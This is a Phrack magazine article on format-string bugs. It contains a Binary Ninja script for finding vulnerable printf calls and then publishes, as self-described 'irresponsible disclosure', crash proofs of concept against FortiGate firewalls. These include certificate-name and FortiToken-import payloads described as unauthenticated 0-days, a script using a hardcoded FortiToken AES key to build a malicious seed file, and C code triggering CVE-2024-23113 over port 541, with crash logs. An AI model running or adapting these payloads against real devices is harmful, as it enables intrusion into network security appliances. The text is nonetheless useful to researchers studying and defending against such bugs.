<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
   <meta http-equiv="content-language" content="en" />
   <meta name="description" content="Phrack staff website." />
   <meta name="keywords" content="phrack" />
   <meta name="robots" content="follow,index,all" />

   <meta name="revisit-after" content="7 days" />
   
   <title>.:: Phrack Magazine ::.</title>
   
   <link href="../../css/style.css" rel="stylesheet" type="text/css">
</head>
<body id="top">
<div align="center" class="texto-2-bold">
[ <a href="../../index.html" title="News">News</a> ]
[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
[ <a href="../../authors.html" title="Authors">Authors</a> ]
[ <a href="../../archives/" title="Archives">Archives</a> ]
[ <a href="../../contact.html" title="Contact">Contact</a> ]

</div>

<center>
   <br>
   <br>
   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
   <br>

   <div class="texto-2">
   <div class="p-title">.:: Long Live Format Strings ::.</div>
   <hr width="600" />
   </div>
   
   <div style="padding-top: 4px; padding-bottom: 4px;">
<div class="around">

<div class="details"><strong>Issues</strong>: 
[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a class="current" href="../../issues/71/1.html" title="Issue 71">71</a> ] 
</div>
<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack71.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack71.tar.gz" title="Get current issue tar.gz">71</a> | <strong>Release date</strong> : <b>2024-08-19</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>

<div style="border-top: 1px solid black; border-bottom: 2px solid black">
<table class="tissue" cellpadding="0" cellspacing="0">
   <tbody>
      <tr><td align="left"><a href="../../issues/71/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/71/2.html#article">Phrack Prophile on BSDaemon</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/71/3.html#article">Linenoise</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/71/4.html#article">Loopback</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/71/5.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/71/6.html#article">MPEG-CENC: Defective by Specification</a></td><td align="right">David &quot;retr0id&quot; Buchanan</td></tr>
<tr><td align="left"><a href="../../issues/71/7.html#article">Bypassing CET &amp; BTI With Functional Oriented Programming</a></td><td align="right">LMS</td></tr>
<tr><td align="left"><a href="../../issues/71/8.html#article">World of SELECT-only PostgreSQL Injections</a></td><td align="right">Maksym Vatsyk</td></tr>
<tr><td align="left"><a href="../../issues/71/9.html#article">A VX Adventure in Build Systems and Oldschool Techniques</a></td><td align="right">Amethyst Basilisk</td></tr>
<tr><td align="left"><a href="../../issues/71/10.html#article">Allocating new exploits</a></td><td align="right">r3tr074</td></tr>
<tr><td align="left"><a href="../../issues/71/11.html#article">Reversing Dart AOT snapshots</a></td><td align="right">cryptax</td></tr>
<tr><td align="left"><a href="../../issues/71/12.html#article">Finding hidden kernel modules (extrem way reborn)</a></td><td align="right">g1inko</td></tr>
<tr><td align="left"><a href="../../issues/71/13.html#article">A novel page-UAF exploit strategy</a></td><td align="right">Jinmeng Zhou, Jiayi Hu, Wenbo Shen, Zhiyun Qian</td></tr>
<tr><td align="left"><a href="../../issues/71/14.html#article">Stealth Shell: A Fully Virtualized Attack Toolchain</a></td><td align="right">Ryan Petrich</td></tr>
<tr><td align="left"><a href="../../issues/71/15.html#article">Evasion by De-optimization</a></td><td align="right">Ege BALCI</td></tr>
<tr><td align="left"><a href="../../issues/71/16.html#article">Long Live Format Strings</a></td><td align="right">Mark Remarkable</td></tr>
<tr><td align="left"><a href="../../issues/71/17.html#article">Calling All Hackers</a></td><td align="right">cts</td></tr>

   </tbody>
</table>

<div class="opt" id="article"><strong>Title</strong> : Long Live Format Strings</div>
<div class="opt-bottom"> <strong>Author</strong> : Mark Remarkable</div>
<pre>                             ==Phrack Inc.==

                Volume 0x10, Issue 0x47, Phile #0x10 of 0x11

|=-----------------------------------------------------------------------=|
|=--------------------=[ Long Live Format Strings ]=---------------------=|
|=-----------------------------------------------------------------------=|
|=-------------------------=[ Mark Remarkable ]=-------------------------=|
|=-----------------------------------------------------------------------=|

  0. Introduction
  1. Finding Format String Bugs
  2. Beating a Dead Firewall

---[ 0 - Introduction

Format string attacks should be dead. glibc's FORTIFY_SOURCE was released
nearly 20 years ago. It's enabled by default. Vulnerabilities are trivial 
to detect with static source code analysis. You have to be actively trying 
to make a vulnerable piece of software. And yet, despite the existence of 
foolproof protections, we still see multi-billion dollar companies ship 
code with obvious format string vulnerabilities.

This article will consist of a few lines of code and a few boring 0-day's,
just to keep the reader interested.

---[ 1 - Finding Format String Bugs 

Most format strings are hardcoded, or at least come from a small set of 
possible values. The exceptions to this pattern are what introduce format
string bugs. Modern reverse engineering tools make it incredibly easy to 
filter format string function calls down to the 1% of exceptions. Although 
there are better scripts out there, this simple Binary Ninja script was 
good enough to find a few quick 0days

  fns={
    &quot;printf&quot;:0,
    &quot;fprintf&quot;:1,
    &quot;dprintf&quot;:1,
    &quot;sprintf&quot;:1,
    &quot;snprintf&quot;:2,
    &quot;vprintf&quot;:0,
    &quot;vfprintf&quot;:1,
    &quot;vsprintf&quot;:1,
    &quot;vsnprintf&quot;:2,
  }
 
  def check(function,arg):
      for caller in function.caller_sites:
          try: inst=caller.mlil.ssa_form
          except KeyboardInterrupt as e: return
          except Exception: continue
          if inst is None: continue
          op=inst.operation
          if op in (MediumLevelILOperation.MLIL_CALL_SSA,
              MediumLevelILOperation.MLIL_CALL_UNTYPED_SSA,
              MediumLevelILOperation.MLIL_TAILCALL_SSA):
              if len(inst.params)&lt;arg+1: continue
              if inst.dest.constant!=function.lowest_address: continue
          else: continue
          param=inst.params[arg]
          possible=param.possible_values
          if possible.type in (RegisterValueType.StackFrameOffset,
              RegisterValueType.UndeterminedValue):
              yield inst.address
 
  for f in functions:
      print(&quot;-----&quot;+f+&quot;-----)
      for ff in bv.get_functions_by_name(f):
          for i in check(ff, fns[f]):
              print(hex(i))

Put simply, this script checks for every call to a printf-family function,
then checks if the format argument is a constant value, or a stack buffer. 
There are, of course, plenty of better tools to perform this kind of basic 
static analysis, but I want to make the point that you don't have to be a 
skilled exploit dev to find format string bugs in a poorly made piece of 
software.

---[ 2 - Beating a Dead Firewall

Running that script against something very secure like the Fortinet 
/bin/init binary, you could easily rack up enough CVEs to pad your resume.
Luckily for you, and in the spirit of irresponsible disclosure, I am 
publishing a few crashes just for Phrack! Please enjoy two 0day 
unauthenticated bugs, and one unauthenticated n-day:

---- [ 2.1 - Certificate Import

I heard somewhere that PKI is important. I wonder what happens if I add 
some %n's to the certificate name on import...

  1. System -&gt; Certificates -&gt; Create/Import -&gt; Certificate
     -&gt; Import Certificate -&gt; Certificate
  2. Add a valid certificate file and key file
  3. Set the certificate name to %4919$1$c%n%n%n%n%n%n%n%n%n
  4. Click create

Internal server error? Let's check the crash log.

  # diagnose debug crashlog read

  &lt;02946&gt; firmware FortiGate-VM64 v7.2.7,build1577b1577,240131 (GA.M) (Release)
  &lt;02946&gt; application httpsd
  &lt;02946&gt; *** signal 11 (Segmentation fault) received ***
  &lt;02946&gt; Register dump:
  &lt;02946&gt; RAX: 0000000010c9dde0   RBX: 0000000010caf09c
  &lt;02946&gt; RCX: 00007fffd366e008   RDX: 00007f132d45bfc0
  &lt;02946&gt; R08: 0000000010c97050   R09: 00007f132d49abe0
  &lt;02946&gt; R10: 0000000000004000   R11: 0000000000000000
  &lt;02946&gt; R12: 00007fffd3668570   R13: 0000000000001337
  &lt;02946&gt; R14: 0000000000000009   R15: 00000000000006d9
  &lt;02946&gt; RSI: 00007fffd366a288   RDI: 00007fffd366e000
  &lt;02946&gt; RBP: 00007fffd3668dd0   RSP: 00007fffd3668480
  &lt;02946&gt; RIP: 00007f132d346c6c   EFLAGS: 0000000000010212
  &lt;02946&gt; CS:  0033   FS: 0000   GS: 0000
  &lt;02946&gt; Trap: 000000000000000e   Error: 0000000000000004
  &lt;02946&gt; OldMask: 0000000000000000
  &lt;02946&gt; CR2: 00007fffd366e000
  &lt;02946&gt; stack: 0x7fffd3668480 - 0x7fffd366d490 
  &lt;02946&gt; Backtrace:
  &lt;02946&gt; [0x7f132d346c6c] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
  00064c6c
  &lt;02946&gt; [0x7f132d34905d] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
  0006705d
  &lt;02946&gt; [0x7f132d35c826] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
  0007a826
  &lt;02946&gt; [0x7f132d335d42] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6 
  (__snprintf+0x00000092) liboffset 00053d42
  &lt;02946&gt; [0x0222351b] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x02223a65] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00ddb567] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00d08dc4] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00d09419] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00d0b547] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00d0d01d] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00caeef9] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00e9984a] =&gt; /bin/httpsd (ap_run_handler+0x0000004a) 
  &lt;02946&gt; [0x00e9a0a6] =&gt; /bin/httpsd (ap_invoke_handler+0x000000c6) 
  &lt;02946&gt; [0x00ee1ec9] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00ee2111] =&gt; /bin/httpsd (ap_process_request+0x00000021) 
  &lt;02946&gt; [0x00eda23f] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00e9e0aa] =&gt; /bin/httpsd (ap_run_process_connection+0x0000004a) 
  &lt;02946&gt; [0x00eb3cb7] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00eb3f86] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00eb4174] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00eb47ad] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00eafa51] =&gt; /bin/httpsd (ap_run_mpm+0x00000061) 
  &lt;02946&gt; [0x00eaf586] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00449f6f] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x0044f498] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x0044fc8a] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x004524af] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x00452dd9] =&gt; /bin/httpsd  
  &lt;02946&gt; [0x7f132d305deb] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6 
  (__libc_start_main+0x000000eb) liboffset 00023deb
  &lt;02946&gt; [0x004450da] =&gt; /bin/httpsd  

R13 contains 0x1337, which just so happens to be the exact number of bytes
we just printed with %4919$1$c. Looks like a vuln to me!

---- [ 2.2 - FortiToken import

MFA solves all security problems, and Fortinet makes MFA easy with 
FortiTokens. Let's generate some FortiToken seed files:

  ----- ftk.py -----
  import base64
  from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
  from cryptography.hazmat.backends import default_backend
  # lol hardcoded key
  FTK_KEY=&quot;3F2FE4F6E40B53CFF0B5948993F4D4AB369C7F0375FDC92D64CB3E8880FFAE4E&quot;
  FTK_KEY=bytes.fromhex(FTK_KEY)
  format_str=b'%4919$1$c%n%n%n '
  iv=b'\0'*16
  a=Cipher(algorithms.AES(FTK_KEY), modes.CBC(iv), backend=default_backend())
  e=a.encryptor()
  ct=e.update(format_str)
  ciphertext=base64.b64encode(ct).decode()
  print(f&quot;FTK00000000000EA,{ciphertext},{iv.hex()}&quot;)
  ------ ftk.py -----

  $ python3 ftk.py &gt; poc.ftk
 
Importing a seed file is easy:

  1. User &amp; Authentication -&gt; FortiTokens -&gt; Create New -&gt; Import -&gt; Seed File
  2. Upload poc.ftk
 
Hmm... what's this? Another error? Let's see what the crashlog has to say:

  &lt;02664&gt; firmware FortiGate-VM64 v7.2.7,build1577b1577,240131 (GA.M) (Release)
  &lt;02664&gt; application httpsd
  &lt;02664&gt; *** signal 11 (Segmentation fault) received ***
  &lt;02664&gt; Register dump:
  &lt;02664&gt; RAX: 0000000010da2830   RBX: 0000000010db020c
  &lt;02664&gt; RCX: 00007ffd536af008   RDX: 00007fd3f60e3fc0
  &lt;02664&gt; R08: 0000000010d981c0   R09: 00007fd3f6122be0
  &lt;02664&gt; R10: 0000000000000010   R11: 0000000000000000
  &lt;02664&gt; R12: 00007ffd536a7900   R13: 0000000000001337
  &lt;02664&gt; R14: 0000000000000004   R15: 0000000000000a67
  &lt;02664&gt; RSI: 00007ffd536a9618   RDI: 00007ffd536af000
  &lt;02664&gt; RBP: 00007ffd536a8160   RSP: 00007ffd536a7810
  &lt;02664&gt; RIP: 00007fd3f5fcec6c   EFLAGS: 0000000000010212
  &lt;02664&gt; CS:  0033   FS: 0000   GS: 0000
  &lt;02664&gt; Trap: 000000000000000e   Error: 0000000000000004
  &lt;02664&gt; OldMask: 0000000000000000
  &lt;02664&gt; CR2: 00007ffd536af000
  &lt;02664&gt; stack: 0x7ffd536a7810 - 0x7ffd536acfc0 
  &lt;02664&gt; Backtrace:
  &lt;02664&gt; [0x7fd3f5fcec6c] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
  00064c6c
  &lt;02664&gt; [0x7fd3f5fd105d] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
  0006705d
  &lt;02664&gt; [0x7fd3f5fe4826] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
  0007a826
  &lt;02664&gt; [0x7fd3f5fbdd42] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6 
  (__snprintf+0x00000092) liboffset 00053d42
  &lt;02664&gt; [0x0290048a] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00de6fbd] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00d08dc4] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00d09419] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00d0b547] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00d0d01d] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00caeef9] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00e9984a] =&gt; /bin/httpsd (ap_run_handler+0x0000004a) 
  &lt;02664&gt; [0x00e9a0a6] =&gt; /bin/httpsd (ap_invoke_handler+0x000000c6) 
  &lt;02664&gt; [0x00ee1ec9] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00ee2111] =&gt; /bin/httpsd (ap_process_request+0x00000021) 
  &lt;02664&gt; [0x00eda23f] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00e9e0aa] =&gt; /bin/httpsd (ap_run_process_connection+0x0000004a) 
  &lt;02664&gt; [0x00eb3cb7] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00eb3f86] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00eb3fcb] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00eb48e5] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00eafa51] =&gt; /bin/httpsd (ap_run_mpm+0x00000061) 
  &lt;02664&gt; [0x00eaf586] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00449f6f] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x0044f498] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x0044fc8a] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x004524af] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x00452dd9] =&gt; /bin/httpsd  
  &lt;02664&gt; [0x7fd3f5f8ddeb] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6 
  (__libc_start_main+0x000000eb) liboffset 00023deb
  &lt;02664&gt; [0x004450da] =&gt; /bin/httpsd  

Unsurprisingly, this crash looks almost identical to the last one. The only
difference is the stack trace, which shows

  (__snprintf+0x00000092) liboffset 00053d42
  [0x0290048a] =&gt; /bin/httpsd
  [0x00de6fbd] =&gt; /bin/httpsd
  [0x00d08dc4] =&gt; /bin/httpsd

rather than 

  (__snprintf+0x00000092) liboffset 00053d42
  [0x0222351b] =&gt; /bin/httpsd
  [0x02223a65] =&gt; /bin/httpsd
  [0x00ddb567] =&gt; /bin/httpsd

---- [ 2.3 - CVE-2024-23113

Does CVE-2024-23113 sound too complicated? In reality, it's as shrimple as

  #include &lt;string.h&gt;
  #include &lt;unistd.h&gt;
  #include &lt;sys/socket.h&gt;
  #include &lt;arpa/inet.h&gt;
  #include &lt;openssl/ssl.h&gt;
  #include &lt;openssl/err.h&gt;
  
  char *payload=\
  &quot;reply 200\r\n&quot;\
  &quot;request=auth\r\n&quot;\
  &quot;mgmtip=%270441$1$c%n%n%n%n%n%n%n%n%n%n\r\n&quot;\
  &quot;\r\n&quot;;
  
  #define HOST &quot;69.69.69.69&quot;
  #define PORT 541
  #define KEYFILE &quot;key.pem&quot;
  #define CERTFILE &quot;cert.pem&quot;
  
  void main(){
    int sock;
    struct sockaddr_in sa={0};
    SSL_CTX *ctx;
    SSL *ssl;
    const SSL_METHOD *method;
    uint32_t len_be;
    char *fgfm_magic=&quot;\x36\xe0\x11\x00&quot;;
    
    method=TLS_server_method();
    ctx=SSL_CTX_new(method);
    SSL_CTX_use_certificate_file(ctx, CERTFILE, SSL_FILETYPE_PEM);
    SSL_CTX_use_PrivateKey_file(ctx, KEYFILE, SSL_FILETYPE_PEM);
    sock=socket(AF_INET, SOCK_STREAM, 0);
    sa.sin_family=AF_INET;
    sa.sin_port=htons(PORT);
    sa.sin_addr.s_addr=inet_addr(HOST);
    connect(sock, &amp;sa, sizeof(struct sockaddr));
    ssl=SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    
    if(SSL_accept(ssl)&lt;=0)
      ERR_print_errors_fp(stderr);
    else{
      len_be=htonl(strlen(payload)+1+8);
      SSL_write(ssl, fgfm_magic, 4);
      SSL_write(ssl, &amp;len_be, 4);
      SSL_write(ssl, payload, strlen(payload)+1);
    }
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);
    SSL_CTX_free(ctx);
  }

Just change the HOST and provide a key.pem/cert.pem. The hardest part about
developing a crash POC was realizing the TCP client is acting as the TLS 
server. The protocol itself is just a magic number, size field, and 
text-based body.

  &lt;23066&gt; firmware FortiGate-VM64 v7.2.4,build1396b1396,230131 (GA.F) 
  (Release)
  &lt;23066&gt; application fgfmsd
  &lt;23066&gt; *** signal 11 (Segmentation fault) received ***
  &lt;23066&gt; Register dump:
  &lt;23066&gt; RAX: 00007f652c3d2040   RBX: 00007f652c8f7844
  &lt;23066&gt; RCX: 00007ffd3fe86008   RDX: 00007f6531e7afc0
  &lt;23066&gt; R08: 00007f652c3cf010   R09: 0000000000000000
  &lt;23066&gt; R10: 0000000000000022   R11: 0000000000000246
  &lt;23066&gt; R12: 00007ffd3fe83780   R13: 0000000000042069
  &lt;23066&gt; R14: 000000000000000b   R15: 0000000000000303
  &lt;23066&gt; RSI: 00007ffd3fe84138   RDI: 00007ffd3fe86000
  &lt;23066&gt; RBP: 00007ffd3fe83fe0   RSP: 00007ffd3fe83690
  &lt;23066&gt; RIP: 00007f6531d65c6c   EFLAGS: 0000000000010212
  &lt;23066&gt; CS:  0033   FS: 0000   GS: 0000
  &lt;23066&gt; Trap: 000000000000000e   Error: 0000000000000004
  &lt;23066&gt; OldMask: 0000000000000000
  &lt;23066&gt; CR2: 00007ffd3fe86000
  &lt;23066&gt; stack: 0x7ffd3fe83690 - 0x7ffd3fe854d0 
  &lt;23066&gt; Backtrace:
  &lt;23066&gt; [0x7f6531d65c6c] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
  00064c6c
  &lt;23066&gt; [0x7f6531d6805d] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
  0006705d
  &lt;23066&gt; [0x7f6531d7b826] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
  0007a826
  &lt;23066&gt; [0x7f6531d54d42] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6 
  (__snprintf+0x00000092) liboffset 00053d42
  &lt;23066&gt; [0x00acc6aa] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x00acd30c] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x00acdcef] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x00aee12a] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x00ae8674] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x00ad60ba] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x00ae1d11] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x00449eaf] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x004531da] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x0044fd9c] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x00452428] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x00452d71] =&gt; /bin/fgfmd  
  &lt;23066&gt; [0x7f6531d24deb] =&gt; /usr/lib/x86_64-linux-gnu/libc.so.6 
  (__libc_start_main+0x000000eb) liboffset 00023deb
  &lt;23066&gt; [0x00444f1a] =&gt; /bin/fgfmd  

|=[ EOF ]=---------------------------------------------------------------=|
</pre>

</div>
</div>

</center>

<div align="center" class="texto-2-bold">
[ <a href="../../index.html" title="News">News</a> ]
[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
[ <a href="../../authors.html" title="Authors">Authors</a> ]
[ <a href="../../archives/" title="Archives">Archives</a> ]
[ <a href="../../contact.html" title="Contact">Contact</a> ]
</div>

<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
</body>
</html>
